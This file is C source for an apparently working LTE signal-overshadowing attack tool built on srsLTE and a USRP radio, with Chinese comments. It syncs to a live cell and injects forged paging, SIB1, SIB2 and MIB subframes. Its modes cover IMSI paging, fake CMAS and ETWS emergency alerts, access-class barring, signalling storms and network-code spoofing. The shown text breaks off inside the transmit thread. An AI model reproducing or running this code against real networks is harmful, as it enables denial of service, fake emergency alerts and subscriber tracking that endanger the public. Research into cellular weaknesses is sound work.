#include <uhd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <sys/select.h>
#include <pthread.h>
#include <semaphore.h>
#include <signal.h>
#include <srslte/phy/common/phy_common.h>
#include <srslte/phy/phch/pdsch_cfg.h>
#include "srslte/srslte.h"
#include "srslte/phy/rf/rf.h"
#include "srslte/phy/rf/rf_utils.h"
#include "srslte/phy/common/phy_common.h"
#include "../src/phy/rf/uhd_c_api.h"
#include "pdsch_enodeb.h"
#include "hj.h"

#define UE_CRNTI 0xFFFF
#define M_CRNTI 0xFFFD
#define LEFT_KEY 68
#define RIGHT_KEY 67
#define UP_KEY 65
#define DOWN_KEY 66
#define PAGING_IMSI 0
#define SIB1_SIG_STORM 1
#define SIB2_AC_BARRING 2
#define SIB1_MNC 3
#define MIB_DLBW 4
#define SIB1_CMAS 5
#define PAGING_ETWS 6

srslte_rf_t rf;
int attack_mode = -1;

cell_search_cfg_t cell_detect_config = {
    SRSLTE_DEFAULT_MAX_FRAMES_PBCH,
    SRSLTE_DEFAULT_MAX_FRAMES_PSS,
    SRSLTE_DEFAULT_NOF_VALID_PSS_FRAMES,
    0};

srslte_cell_t cell = {
    100,               // nof_prb
    2,                 // nof_ports
    420,               // cell_id
    SRSLTE_CP_NORM,    // cyclic prefix
    SRSLTE_PHICH_NORM, // PHICH length
    SRSLTE_PHICH_R_1   // PHICH resources
};

uint16_t c = -1;

int net_port = -1; // -1 generates random data That means there is some problem sending samples to the device

uint32_t cfi = 2;
uint32_t mcs_idx = 1, last_mcs_idx = 1;
int nof_frames = -1;

char mimo_type_str[32] = "single";
uint32_t nof_tb = 1;
uint32_t multiplex_pmi = 0;
uint32_t multiplex_nof_layers = 1;

int mbsfn_area_id = -1;
char *rf_args = "";
char *input_file_sf9 = "output";
float rf_amp = 0.8, rf_gain = 15.0, rf_freq = 2400000000;
srslte_ue_sync_t ue_sync;
srslte_ue_dl_t ue_dl;
srslte_ue_mib_t ue_mib;
int sfn;
int rx_ret = -1; // 接收线程的状态变量 -1表示失败 0表示成功
int sf_idx;
bool updated = false;

bool null_file_sink = false;
srslte_filesink_t fsink;
srslte_ofdm_t ifft[SRSLTE_MAX_PORTS];
srslte_ofdm_t ifft_mbsfn;
srslte_pbch_t pbch;
srslte_pcfich_t pcfich;
srslte_pdcch_t pdcch;
srslte_pdsch_t pdsch;
srslte_pdsch_cfg_t pdsch_cfg;
srslte_pmch_t pmch;
srslte_pdsch_cfg_t pmch_cfg;
srslte_softbuffer_tx_t *softbuffers[SRSLTE_MAX_CODEWORDS];
srslte_regs_t regs;
srslte_ra_dl_dci_t ra_dl;
int rvidx[SRSLTE_MAX_CODEWORDS] = {0, 0};

cf_t *sf_buffer[SRSLTE_MAX_PORTS] = {NULL}, *output_buffer[SRSLTE_MAX_PORTS] = {NULL};
cf_t *sf_buffer_sync[SRSLTE_MAX_PORTS] = {NULL};
cf_t *output_buffer2[SRSLTE_MAX_PORTS] = {NULL};
cf_t *output_buffer3[SRSLTE_MAX_PORTS] = {NULL};
cf_t *output_buffer4[SRSLTE_MAX_PORTS] = {NULL};
cf_t *output_buffer_offset[SRSLTE_MAX_PORTS] = {NULL};

int sf_n_re, sf_n_samples;

srslte_timestamp_t last_stamp;
pthread_t net_thread;
pthread_t tx_thread;
pthread_t rx_thread;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER; // 线程的互斥锁
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
void *net_thread_fnc(void *arg);
sem_t net_sem;
bool net_packet_ready = false;
srslte_netsource_t net_source;
srslte_netsink_t net_sink;

int prbset_num = 1, last_prbset_num = 1;
int prbset_orig = 0;

#define DATA_BUFF_SZ 1024 * 1024
uint8_t *data[2], data2[DATA_BUFF_SZ];
uint8_t data_tmp[DATA_BUFF_SZ];

void usage(char *prog) // 帮助菜单
{
    printf("Usage: %s [agmfoncvpuxb]\n", prog);
    printf("\t-a RF args [Default %s]\n", rf_args);
    printf("\t-l RF amplitude [Default %.2f]\n", rf_amp);
    printf("\t-g RF TX gain [Default %.2f dB]\n", rf_gain);
    printf("\t-f RF TX frequency [Default %.1f MHz]\n", rf_freq / 1000000);
    printf("\t-D Demo case [0: IMSI paging, 1: CMAS, 2: Signalling Storm(TAU), 3: AC Barring\n");
    printf("\t-i Input file name for IMSI paging, subframe 9 [Default %s]\n", input_file_sf9);
    printf("\t-o output_file [Default use RF board]\n");
    printf("\t-m MCS index [Default %d]\n", mcs_idx);
    printf("\t-n number of frames [Default %d]\n", nof_frames);
    printf("\t-c cell id [Default %d]\n", cell.id);
    printf("\t-p nof_prb [Default %d]\n", cell.nof_prb);
    printf("\t-M MBSFN area id [Default %d]\n", mbsfn_area_id);
    printf("\t-x Transmission mode[single|diversity|cdd|multiplex] [Default %s]\n", mimo_type_str);
    printf("\t-b Precoding Matrix Index (multiplex mode only)* [Default %d]\n", multiplex_pmi);
    printf("\t-w Number of codewords/layers (multiplex mode only)* [Default %d]\n", multiplex_nof_layers);
    printf("\t-u listen TCP port for input data (-1 is random) [Default %d]\n", net_port);
    printf("\t-v [set srslte_verbose to debug, default none]\n");
    printf("\n");
    printf("\t*: See 3GPP 36.212 Table  5.3.3.1.5-4 for more information\n");
}

void parse_args(int argc, char **argv)
{
    int opt;
    while ((opt = getopt(argc, argv, "DiaglfmoncpvutxbwM")) != -1)
    {
        switch (opt)
        {
        case 'D': // 选择的攻击类型
            attack_mode = atoi(argv[optind]);
            if (attack_mode == PAGING_IMSI) // 0
                printf("\033[1;32m[+] 当前选择的攻击类型: Paging-IMSI\n\033[0m");
            else if (attack_mode == SIB1_SIG_STORM) // 1
                printf("\033[1;32m[+] 当前选择的攻击类型: SIB1_SIG_STORM\n\033[0m");
            else if (attack_mode == SIB2_AC_BARRING) // 2
                printf("\033[1;32m[+] 当前选择的攻击类型: SIB2_AC_BARRING\n\033[0m");
            else if (attack_mode == SIB1_MNC) // 3
                printf("\033[1;32m[+] 当前选择的攻击类型: SIB1_MNC\n\033[0m");
            else if (attack_mode == MIB_DLBW) // 4
                printf("\033[1;32m[+] 当前选择的攻击类型: MIB_DLBW\n\033[0m");
            else if (attack_mode == SIB1_CMAS) // 5
                printf("\033[1;32m[+] 当前选择的攻击类型: SIB1_CMAS\n\033[0m");
            else if (attack_mode == PAGING_ETWS) // 6
                printf("\033[1;32m[+] 当前选择的攻击类型: PAGING_ETWS\n\033[0m");
            break;
        case 'i': // 输入文件
            input_file_sf9 = argv[optind];
            break;
        case 'a': // usrp 的参数
            rf_args = argv[optind];
            break;
        case 'g': // 增益
            rf_gain = atof(argv[optind]);
            break;
        case 'l':
            rf_amp = atof(argv[optind]);
            break;
        case 'f': // 小区的频率，即发送和接收的频率
            rf_freq = atof(argv[optind]);
            break;
        case 'm':
            mcs_idx = atoi(argv[optind]);
            break;
        case 'u':
            net_port = atoi(argv[optind]);
            break;
        case 'n':
            nof_frames = atoi(argv[optind]);
            break;
        case 'p':
            cell.nof_prb = atoi(argv[optind]);
            break;
        case 'c':
            cell.id = atoi(argv[optind]);
            break;
        case 'x':
            strncpy(mimo_type_str, argv[optind], 31);
            mimo_type_str[31] = 0;
            break;
        case 'b':
            multiplex_pmi = (uint32_t)atoi(argv[optind]);
            break;
        case 'w':
            multiplex_nof_layers = (uint32_t)atoi(argv[optind]);
            break;
        case 'M':
            mbsfn_area_id = atoi(argv[optind]);
            break;
        case 'v': // 更详细的输出
            srslte_verbose++;
            break;
        default:
            usage(argv[0]);
            exit(-1);
        }
    }
}

// 封装 RF 接收接口，把 srsLTE 里统一的数据格式 (cf_t*) 转换成底层驱动需要的 void*；
// 顺带把接收时间戳记录下来，方便上层调用，不用直接操作 srslte_rf_recv_with_time_multi
#ifndef DISABLE_RF
int srslte_rf_recv_wrapper(void *h, cf_t *data[SRSLTE_MAX_PORTS], uint32_t nsamples, srslte_timestamp_t *t)
{
    // printf(" ----  Receive %d samples  ---- \n", nsamples);
    void *ptr[SRSLTE_MAX_PORTS];
    for (int i = 0; i < SRSLTE_MAX_PORTS; i++)
    {
        ptr[i] = data[i];
    }
    // return srslte_rf_recv_with_time_multi(h, ptr, nsamples, true, NULL, NULL);
    return srslte_rf_recv_with_time_multi(h, ptr, nsamples, true, &(t->full_secs), &(t->frac_secs));
}
#endif

// 封装一个安全的 buffer 分配并清零函数
void *alloc_cf_buffer(size_t nsamples, const char *name)
{
    void *buf = srslte_vec_malloc(sizeof(cf_t) * nsamples);
    if (!buf)
    {
        fprintf(stderr, "Error allocating %s buffer\n", name);
        perror("malloc");
        exit(-1);
    }
    memset(buf, 0, sizeof(cf_t) * nsamples);
    return buf;
}

// 封装成给所有端口分配的函数
void alloc_buffer_array(void *buffers[], int nports, size_t nsamples, const char *name)
{
    for (int i = 0; i < nports; i++)
    {
        buffers[i] = alloc_cf_buffer(nsamples, name);
    }
}

void base_init()
{
    int i;
    /* Select transmission mode */
    if (srslte_str2mimotype(mimo_type_str, &pdsch_cfg.mimo_type))
    {
        ERROR("Wrong transmission mode! Allowed modes: single, diversity, cdd and multiplex");
        exit(-1);
    }

    /* Configure cell and PDSCH in function of the transmission mode */
    switch (pdsch_cfg.mimo_type)
    {
    case SRSLTE_MIMO_TYPE_SINGLE_ANTENNA:
        cell.nof_ports = 1;
        break;
    case SRSLTE_MIMO_TYPE_TX_DIVERSITY:
        cell.nof_ports = 2;
        break;
    case SRSLTE_MIMO_TYPE_CDD:
        cell.nof_ports = 2;
        break;
    case SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX:
        cell.nof_ports = 2;
        break;
    default:
        ERROR("Transmission mode not implemented.");
        exit(-1);
    }

    /* Allocate memory */
    for (i = 0; i < SRSLTE_MAX_CODEWORDS; i++)
    {
        data[i] = srslte_vec_malloc(sizeof(uint8_t) * SOFTBUFFER_SIZE);
        if (!data[i])
        {
            perror("malloc");
            exit(-1);
        }
        bzero(data[i], sizeof(uint8_t) * SOFTBUFFER_SIZE);
    }

    /* init memory */
    alloc_buffer_array((void **)sf_buffer, SRSLTE_MAX_PORTS, sf_n_re, "sf_buffer");
    alloc_buffer_array((void **)output_buffer, SRSLTE_MAX_PORTS, sf_n_samples * 1.2, "output_buffer");
    alloc_buffer_array((void **)output_buffer2, SRSLTE_MAX_PORTS, sf_n_samples * 1.2, "output_buffer2");
    alloc_buffer_array((void **)output_buffer3, SRSLTE_MAX_PORTS, sf_n_samples * 1.2, "output_buffer3");
    alloc_buffer_array((void **)output_buffer4, SRSLTE_MAX_PORTS, sf_n_samples * 1.2, "output_buffer4");
    alloc_buffer_array((void **)output_buffer_offset, SRSLTE_MAX_PORTS, sf_n_samples * 1.2, "output_buffer_offset");

    printf("\033[1;32m[+] 正在尝试打开射频设备...\n\033[0m");
    if (srslte_rf_open_multi(&rf, rf_args, cell.nof_ports))
    {
        printf("\033[1;33m[+] 射频设备打开失败,请确认设备已连接\n\033[0m");
        exit(-1);
    }

    if (net_port > 0)
    {
        if (srslte_netsource_init(&net_source, "0.0.0.0", net_port, SRSLTE_NETSOURCE_TCP))
        {
            fprintf(stderr, "Error creating input UDP socket at port %d\n", net_port);
            exit(-1);
        }
        if (null_file_sink)
        {
            if (srslte_netsink_init(&net_sink, "127.0.0.1", net_port + 1, SRSLTE_NETSINK_TCP))
            {
                fprintf(stderr, "Error sink\n");
                exit(-1);
            }
        }
        if (sem_init(&net_sem, 0, 1))
        {
            perror("sem_init");
            exit(-1);
        }
    }

    /* create ifft object */
    for (i = 0; i < cell.nof_ports; i++)
    {
        if (srslte_ofdm_tx_init(&ifft[i], SRSLTE_CP_NORM, sf_buffer[i], output_buffer[i], cell.nof_prb))
        {
            fprintf(stderr, "Error creating iFFT object\n");
            exit(-1);
        }

        srslte_ofdm_set_normalize(&ifft[i], true);
    }

    if (srslte_ofdm_tx_init_mbsfn(&ifft_mbsfn, SRSLTE_CP_EXT, sf_buffer[0], output_buffer[0], cell.nof_prb))
    {
        fprintf(stderr, "Error creating iFFT object\n");
        exit(-1);
    }
    srslte_ofdm_set_non_mbsfn_region(&ifft_mbsfn, 2);
    srslte_ofdm_set_normalize(&ifft_mbsfn, true);

    if (srslte_pbch_init(&pbch))
    {
        fprintf(stderr, "Error creating PBCH object\n");
        exit(-1);
    }
    if (srslte_pbch_set_cell(&pbch, cell))
    {
        fprintf(stderr, "Error creating PBCH object\n");
        exit(-1);
    }

    if (srslte_regs_init(&regs, cell))
    {
        fprintf(stderr, "Error initiating regs\n");
        exit(-1);
    }
    if (srslte_pcfich_init(&pcfich, 1))
    {
        fprintf(stderr, "Error creating PBCH object\n");
        exit(-1);
    }
    if (srslte_pcfich_set_cell(&pcfich, &regs, cell))
    {
        fprintf(stderr, "Error creating PBCH object\n");
        exit(-1);
    }
    if (srslte_pdcch_init_enb(&pdcch, cell.nof_prb))
    {
        fprintf(stderr, "Error creating PDCCH object\n");
        exit(-1);
    }
    if (srslte_pdcch_set_cell(&pdcch, &regs, cell))
    {
        fprintf(stderr, "Error creating PDCCH object\n");
        exit(-1);
    }
    if (srslte_pdsch_init_enb(&pdsch, cell.nof_prb))
    {
        fprintf(stderr, "Error creating PDSCH object\n");
        exit(-1);
    }
    if (srslte_pdsch_set_cell(&pdsch, cell))
    {
        fprintf(stderr, "Error creating PDSCH object\n");
        exit(-1);
    }
    srslte_pdsch_set_rnti(&pdsch, UE_CRNTI);
    if (mbsfn_area_id > -1)
    {
        if (srslte_pmch_init(&pmch, cell.nof_prb))
        {
            fprintf(stderr, "Error creating PMCH object\n");
        }
        srslte_pmch_set_area_id(&pmch, mbsfn_area_id);
    }
    for (i = 0; i < SRSLTE_MAX_CODEWORDS; i++)
    {
        softbuffers[i] = calloc(sizeof(srslte_softbuffer_tx_t), 1);
        if (!softbuffers[i])
        {
            fprintf(stderr, "Error allocating soft buffer\n");
            exit(-1);
        }
        if (srslte_softbuffer_tx_init(softbuffers[i], cell.nof_prb))
        {
            fprintf(stderr, "Error initiating soft buffer\n");
            exit(-1);
        }
    }
}

void base_free()
{
    int i;
    for (i = 0; i < SRSLTE_MAX_CODEWORDS; i++)
    {
        srslte_softbuffer_tx_free(softbuffers[i]);
        if (softbuffers[i])
        {
            free(softbuffers[i]);
        }
    }
    srslte_pdsch_free(&pdsch);
    srslte_pdcch_free(&pdcch);
    srslte_regs_free(&regs);
    srslte_pbch_free(&pbch);
    if (mbsfn_area_id > -1)
    {
        srslte_pmch_free(&pmch);
    }
    srslte_ofdm_tx_free(&ifft_mbsfn);
    for (i = 0; i < cell.nof_ports; i++)
    {
        srslte_ofdm_tx_free(&ifft[i]);
    }

    for (i = 0; i < SRSLTE_MAX_CODEWORDS; i++)
    {
        if (data[i])
        {
            free(data[i]);
        }
    }

    for (i = 0; i < SRSLTE_MAX_PORTS; i++)
    {
        if (sf_buffer[i])
        {
            free(sf_buffer[i]);
        }
        if (sf_buffer_sync[i])
        {
            free(sf_buffer_sync[i]);
        }

        if (output_buffer[i])
        {
            free(output_buffer[i]);
        }
        if (output_buffer2[i])
        {
            free(output_buffer2[i]);
        }
        if (output_buffer3[i])
        {
            free(output_buffer3[i]);
        }
        if (output_buffer4[i])
        {
            free(output_buffer4[i]);
        }
        if (output_buffer_offset[i])
        {
            free(output_buffer_offset[i]);
        }
    }

    srslte_rf_close(&rf);

    if (net_port > 0)
    {
        srslte_netsource_free(&net_source);
        sem_close(&net_sem);
    }
}

bool go_exit = false;
void sig_int_handler(int signo)
{
    printf("\033[1;33m\n[+] 已收到终止信号, 尝试退出程序...\n\033[0m");
    if (signo == SIGINT)
    {
        go_exit = true;
        updated = true;
        pthread_cond_signal(&cond);
    }
}

unsigned int
reverse(register unsigned int x)
{
    x = (((x & 0xaaaaaaaa) >> 1) | ((x & 0x55555555) << 1));
    x = (((x & 0xcccccccc) >> 2) | ((x & 0x33333333) << 2));
    x = (((x & 0xf0f0f0f0) >> 4) | ((x & 0x0f0f0f0f) << 4));
    x = (((x & 0xff00ff00) >> 8) | ((x & 0x00ff00ff) << 8));
    return ((x >> 16) | (x << 16));
}

uint32_t prbset_to_bitmask()
{
    uint32_t mask = 0;
    int nb = (int)ceilf((float)cell.nof_prb / srslte_ra_type0_P(cell.nof_prb));
    for (int i = 0; i < nb; i++)
    {
        if (i >= prbset_orig && i < prbset_orig + prbset_num)
        {
            mask = mask | (0x1 << i);
        }
    }
    return reverse(mask) >> (32 - nb);
}

int update_radl()
{

    /* Configure cell and PDSCH in function of the transmission mode */
    switch (pdsch_cfg.mimo_type)
    {
    case SRSLTE_MIMO_TYPE_SINGLE_ANTENNA:
        pdsch_cfg.nof_layers = 1;
        nof_tb = 1;
        break;
    case SRSLTE_MIMO_TYPE_TX_DIVERSITY:
        pdsch_cfg.nof_layers = 2;
        nof_tb = 1;
        break;
    case SRSLTE_MIMO_TYPE_CDD:
        pdsch_cfg.nof_layers = 2;
        nof_tb = 2;
        break;
    case SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX:
        pdsch_cfg.nof_layers = multiplex_nof_layers;
        nof_tb = multiplex_nof_layers;
        break;
    default:
        ERROR("Transmission mode not implemented.");
        exit(-1);
    }

    bzero(&ra_dl, sizeof(srslte_ra_dl_dci_t));
    ra_dl.harq_process = 0;
    ra_dl.mcs_idx = mcs_idx;
    ra_dl.ndi = 0;
    ra_dl.rv_idx = rvidx[0];
    ra_dl.alloc_type = SRSLTE_RA_ALLOC_TYPE0;
    ra_dl.type0_alloc.rbg_bitmask = prbset_to_bitmask();
    ra_dl.tb_en[0] = 1;

    if (nof_tb > 1)
    {
        ra_dl.mcs_idx_1 = mcs_idx;
        ra_dl.ndi_1 = 0;
        ra_dl.rv_idx_1 = rvidx[1];
        ra_dl.tb_en[1] = 1;
    }

    srslte_ra_pdsch_fprint(stdout, &ra_dl, cell.nof_prb);
    srslte_ra_dl_grant_t dummy_grant;
    srslte_ra_nbits_t dummy_nbits[SRSLTE_MAX_CODEWORDS];
    srslte_ra_dl_dci_to_grant(&ra_dl, cell.nof_prb, UE_CRNTI, &dummy_grant);
    srslte_ra_dl_grant_to_nbits(&dummy_grant, cfi, cell, 0, dummy_nbits);
    srslte_ra_dl_grant_fprint(stdout, &dummy_grant);
    dummy_grant.sf_type = SRSLTE_SF_NORM;
    if (pdsch_cfg.mimo_type != SRSLTE_MIMO_TYPE_SINGLE_ANTENNA)
    {
        printf("\nTransmission mode key table:\n");
        printf("   Mode   |   1TB   | 2TB |\n");
        printf("----------+---------+-----+\n");
        printf("Diversity |    x    |     |\n");
        printf("      CDD |         |  z  |\n");
        printf("Multiplex | q,w,e,r | a,s |\n");
        printf("\n");
        printf("Type new MCS index (0-28) or mode key and press Enter: ");
    }
    else
    {
        printf("Type new MCS index (0-28) and press Enter: ");
    }
    fflush(stdout);

    return 0;
}

/* Read new MCS from stdin */
int update_control()
{
    char input[128];

    fd_set set;
    FD_ZERO(&set);
    FD_SET(0, &set);

    struct timeval to;
    to.tv_sec = 0;
    to.tv_usec = 0;

    int n = select(1, &set, NULL, NULL, &to);
    if (n == 1)
    {
        // stdin ready
        if (fgets(input, sizeof(input), stdin))
        {
            if (input[0] == 27)
            {
                switch (input[2])
                {
                case RIGHT_KEY:
                    if (prbset_orig + prbset_num < (int)ceilf((float)cell.nof_prb / srslte_ra_type0_P(cell.nof_prb)))
                        prbset_orig++;
                    break;
                case LEFT_KEY:
                    if (prbset_orig > 0)
                        prbset_orig--;
                    break;
                case UP_KEY:
                    if (prbset_num < (int)ceilf((float)cell.nof_prb / srslte_ra_type0_P(cell.nof_prb)))
                        prbset_num++;
                    break;
                case DOWN_KEY:
                    last_prbset_num = prbset_num;
                    if (prbset_num > 0)
                        prbset_num--;
                    break;
                }
            }
            else
            {
                switch (input[0])
                {
                case 'q':
                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
                    multiplex_pmi = 0;
                    multiplex_nof_layers = 1;
                    break;
                case 'w':
                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
                    multiplex_pmi = 1;
                    multiplex_nof_layers = 1;
                    break;
                case 'e':
                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
                    multiplex_pmi = 2;
                    multiplex_nof_layers = 1;
                    break;
                case 'r':
                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
                    multiplex_pmi = 3;
                    multiplex_nof_layers = 1;
                    break;
                case 'a':
                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
                    multiplex_pmi = 0;
                    multiplex_nof_layers = 2;
                    break;
                case 's':
                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_SPATIAL_MULTIPLEX;
                    multiplex_pmi = 1;
                    multiplex_nof_layers = 2;
                    break;
                case 'z':
                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_CDD;
                    break;
                case 'x':
                    pdsch_cfg.mimo_type = SRSLTE_MIMO_TYPE_TX_DIVERSITY;
                    break;
                default:
                    last_mcs_idx = mcs_idx;
                    mcs_idx = atoi(input);
                }
            }
            bzero(input, sizeof(input));
            if (update_radl())
            {
                printf("Trying with last known MCS index\n");
                mcs_idx = last_mcs_idx;
                prbset_num = last_prbset_num;
                return update_radl();
            }
        }
        return 0;
    }
    else if (n < 0)
    {
        // error
        perror("select");
        return -1;
    }
    else
    {
        return 0;
    }
}

/** Function run in a separate thread to receive UDP data */
void *net_thread_fnc(void *arg)
{
    int n;
    int rpm = 0, wpm = 0;

    do
    {
        n = srslte_netsource_read(&net_source, &data2[rpm], DATA_BUFF_SZ - rpm);
        if (n > 0)
        {
            // FIXME: I assume that both transport blocks have same size in case of 2 tb are active
            int nbytes = 1 + (pdsch_cfg.grant.mcs[0].tbs + pdsch_cfg.grant.mcs[1].tbs - 1) / 8;
            rpm += n;
            INFO("received %d bytes. rpm=%d/%d\n", n, rpm, nbytes);
            wpm = 0;
            while (rpm >= nbytes)
            {
                // wait for packet to be transmitted
                sem_wait(&net_sem);
                memcpy(data[0], &data2[wpm], nbytes / (size_t)2);
                memcpy(data[1], &data2[wpm], nbytes / (size_t)2);
                INFO("Sent %d/%d bytes ready\n", nbytes, rpm);
                rpm -= nbytes;
                wpm += nbytes;
                net_packet_ready = true;
            }
            if (wpm > 0)
            {
                INFO("%d bytes left in buffer for next packet\n", rpm);
                memcpy(data2, &data2[wpm], rpm * sizeof(uint8_t));
            }
        }
        else if (n == 0)
        {
            rpm = 0;
        }
        else
        {
            fprintf(stderr, "Error receiving from network\n");
            exit(-1);
        }
    } while (n >= 0);
    return NULL;
}

/*
// 连续发送
void *tx_thread_func() {
  srslte_timestamp_t last_time;
  srslte_timestamp_t future_time;
  bool start_of_burst = true;
  bool end_of_burst = true;
  bool first = true;
  float time_offset = 2;
  usleep(3000000);
  memcpy(&last_time, &last_stamp, sizeof(srslte_timestamp_t));
  while (last_time.full_secs == last_stamp.full_secs && last_time.frac_secs == last_stamp.frac_secs) {
    usleep(10);
  }
  //printf("[1][get_last_time] %.f: %f us\n",difftime(last_time.full_secs, (time_t) 0),(last_time.frac_secs*1e6));
  future_time.full_secs = last_time.full_secs;
  future_time.frac_secs = last_time.frac_secs + time_offset;

  if (future_time.frac_secs >= 1.0) {
    future_time.full_secs++;
    future_time.frac_secs--;
  }

  printf("[future_time] %.f: %f s\n",difftime(future_time.full_secs, (time_t) 0),future_time.frac_secs);
  //printf("[current_time] %.f: %f s\n",difftime(last_stamp.full_secs, (time_t) 0),last_stamp.frac_secs);
  int ret = srslte_rf_send_timed_multi(&rf, (void**) output_buffer2, sf_n_samples*10, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
  if (ret != sf_n_samples*10) {
    printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples*10!!!!!\n");
    exit(-1);
  }
  first = false;
  bool start_of_burst = true;
  while(!go_exit) {
    int ret = srslte_rf_send_multi(&rf, (void**) output_buffer2, sf_n_samples*10, true, start_of_burst, false);
    if (ret != sf_n_samples*10) {
      printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples*10!!!!!\n");
      exit(-1);
    }
    start_of_burst = false;
  }
  return NULL;
}
*/

/*
// 原来的发射函数-定时发送
void *tx_thread_func()
{
    // printf("[TX] TX线程开始执行\n");
    // 绑定线程到第4个CPU核心上，确保时间精度，避免操作系统把线程在不同核心间切换导致时间不准
    unsigned long mask = 8; // 1 2 4 8 (对应核心1,2,3,4)

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0)
    {
        printf("\033[1;31m[x] CPU 核心绑定失败\033[0m");
    }

    // 变量初始化
    srslte_timestamp_t future_time;    // 未来时间戳（用于精确时间发射）
    bool start_of_burst = true;        // 帧开始标志
    bool end_of_burst = true;          // 帧结束标志
    bool first = true;                 // 首次运行标志
    bool paging_stop = false;          // 寻呼停止标志
    float time_offset = 0.01 - 0.0001; // 时间偏移量（10ms - 0.1ms）

    // 同步相关变量
    int cur_sf_idx;                     // 当前子帧索引
    int cur_sfn;                        // 当前系统帧号
    int next_sfn = -1;                  // 下一系统帧号
    int cur_rx_ret;                     // 接收线程时间同步返回值 0表示同步成功
    srslte_timestamp_t cur_time;        // 当前时间戳
    float estimated_cfo, estimated_sfo; // 估计的CFO和SFO

    while (!go_exit) // 主循环，直到退出标志被设置
    {
        pthread_mutex_lock(&mutex); // 获取互斥锁，等待RX线程更新数据
        while (updated == false)    // 等待接收线程更新 updated 标志
        {
            pthread_cond_wait(&cond, &mutex); // 等待条件变量信号并释放互斥锁
        }
        updated = false; // 重置更新标志

        // 获取接收函数修改后的全局变量
        cur_sf_idx = sf_idx;
        cur_sfn = sfn;
        cur_rx_ret = rx_ret; // 接收线程时间同步成功
        memcpy(&cur_time, &last_stamp, sizeof(srslte_timestamp_t));
        // pthread_mutex_unlock(&mutex); // 释放互斥锁

        // 首次运行时的频率偏移估计和补偿
        // if (cur_rx_ret != 0 && cur_sfn >= 0 && first == true)
        if (cur_rx_ret == 0 && cur_sfn >= 0 && first == true)
        {
            int samp_rate = srslte_sampling_freq_hz(cell.nof_prb); // 根据PRB计算采样频率
            estimated_cfo = srslte_ue_sync_get_cfo(&ue_sync);      // 获取载波频率偏移
            estimated_sfo = srslte_ue_sync_get_sfo(&ue_sync);      // 获取采样频率偏移
            first = false;
            printf("[+] Frequency offset estimated..........CFO: %f SFO: %f\n", estimated_cfo, estimated_sfo);
            pthread_mutex_unlock(&mutex); // 释放互斥锁
            continue;
        }

        // 关键逻辑：在特定子帧（0,5,9）发送预录数据
        // if (cur_rx_ret == 0 && cur_sfn >= 0 && (cur_sf_idx == 1 || cur_sf_idx == 5 || cur_sf_idx == 9))
        if (cur_rx_ret == 0 && cur_sfn >= 0)
        {
            // 计算未来发射时间（当前时间 + 偏移）
            memcpy(&future_time, &cur_time, sizeof(srslte_timestamp_t));
            future_time.frac_secs += time_offset;

            // 应用时间校准偏移（不同设备需要不同的偏移量）
            future_time.frac_secs -= (66.0 / 30720000.0); // 30.72 MHz采样率的偏移量

            // 时间戳规范化（处理秒进位）
            if (future_time.frac_secs >= 1.0)
            {
                future_time.full_secs += (int)future_time.frac_secs;
                future_time.frac_secs -= (int)future_time.frac_secs;
            }

            next_sfn = (cur_sfn + 1) % 1024; // 系统帧号循环（0-1023）
            pthread_mutex_unlock(&mutex);    // 释放互斥锁
            int ret = -1;                    // 实际成功发送的采样点数量

            if (attack_mode == 0) // IMSI-Paging
            {
                // 子帧9处理：寻呼信息发送
                if (cur_sf_idx == 9 && !paging_stop)
                {
                    printf("[Subframe %d] Paging Injected! next_sfn: %d future_time: %.f: %f s\n", cur_sf_idx, next_sfn, difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);
                    // 发送output_buffer3中的数据（子帧9的寻呼数据）
                    ret = srslte_rf_send_timed_multi(&rf, (void **)output_buffer3,
                                                     sf_n_samples * 1.2,
                                                     future_time.full_secs, future_time.frac_secs,
                                                     true, start_of_burst, end_of_burst);
                    if (ret != sf_n_samples * 1.2)
                    {
                        printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not sf_n_samples*1.2!!!!!\n\033[0m");
                        exit(-1);
                    }
                }
            }
            else if (attack_mode == 1) // CMAS
            {
                // 子帧5处理：SIB1发送
                if (cur_sf_idx == 5 && !paging_stop)
                {
                    printf("[Subframe %d] SIB1 Injected! next_sfn: %d future_time: %.f: %f s\n", cur_sf_idx, next_sfn, difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);
                    // 发送output_buffer2中的数据（子帧5的SIB数据）
                    ret = srslte_rf_send_timed_multi(&rf, (void **)output_buffer2,
                                                     sf_n_samples * 1.2, // 1.2倍采样点（包含保护间隔）
                                                     future_time.full_secs, future_time.frac_secs,
                                                     true, start_of_burst, end_of_burst);

                    if (ret != sf_n_samples * 1.2)
                    {
                        printf("\033[1;31m[x] Warning!!!!!!!!!: txd sample is not sf_n_samples*1.2!!!!!\n\033[0m");
                        exit(-1);
                    }
                }
            }
            else if (attack_mode == 2) // SIG_STORM
            {
                // 子帧5处理：SIB1发送
                if (cur_sf_idx == 5 && !paging_stop)
                {
                    printf("[Subframe %d] SIB1 Injected! next_sfn: %d future_time: %.f: %f s\n", cur_sf_idx, next_sfn, difftime(future_time.full_secs, (time_t)0), future_time.frac_secs);
                    // 发送output_buffer2中的数据（子帧5的SIB数据）
                    ret = srslte_rf_send_timed_multi(&rf, (void **)output_buffer2,
                                                     sf_n_samples * 1.2, // 1.2倍采样点（包含保护间隔）
                                                     future_time.full_secs, future_time.frac_secs,
                                                     true, start_of_burst, end_of_burst);

